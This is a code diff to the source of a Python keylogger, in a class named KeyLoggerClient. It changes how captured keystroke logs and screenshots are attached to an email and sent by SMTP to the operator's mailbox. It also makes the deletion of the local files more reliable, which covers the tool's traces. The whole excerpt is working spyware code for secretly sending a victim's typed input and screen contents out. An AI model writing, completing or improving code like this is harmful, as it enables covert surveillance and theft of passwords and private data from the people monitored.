@@ -105,7 +105,6 @@ class KeyLoggerClient:
 					body = date_time
 					msg.attach(MIMEText(body, 'plain'))
 					file_attachment = MIMEBase('application', 'octet-stream')
-					image_attachment = MIMEBase('application', 'octet-stream')
 
 					with open(os.path.join(temp_path, filename), 'rb') as handler:
 						file_attachment.set_payload(handler.read())
@@ -114,13 +113,15 @@ class KeyLoggerClient:
 					file_attachment.add_header('Content-Disposition', "attachment; filename=" + filename)
 					msg.attach(file_attachment)
 
-					take_screenshot(temp_path)
-					with open(os.path.join(temp_path, "screenshot.png"), 'rb') as handler:
-						image_attachment.set_payload(handler.read())
+					if take_screenshot(temp_path):
+						image_attachment = MIMEBase('application', 'octet-stream')
 
-					encoders.encode_base64(image_attachment)
-					image_attachment.add_header('Content-Disposition', "attachment; filename=screenshot.png")
-					msg.attach(image_attachment)
+						with open(os.path.join(temp_path, "screenshot.png"), 'rb') as handler:
+							image_attachment.set_payload(handler.read())
+
+						encoders.encode_base64(image_attachment)
+						image_attachment.add_header('Content-Disposition', "attachment; filename=screenshot.png")
+						msg.attach(image_attachment)
 
 					content = msg.as_string()
 
@@ -129,7 +130,10 @@ class KeyLoggerClient:
 						smtp_server.login(self.email_address, self.email_password)
 						smtp_server.sendmail(email_address, email_address, content)
 
-					os.remove(os.path.join(temp_path, filename))
+					if os.path.isfile(os.path.join(temp_path, filename)):
+						os.remove(os.path.join(temp_path, filename))
+					if os.path.isfile(os.path.join(temp_path, "screenshot.png")):
+						os.remove(os.path.join(temp_path, "screenshot.png"))
 
 
 class MenuHandlerClient(threading.Thread):
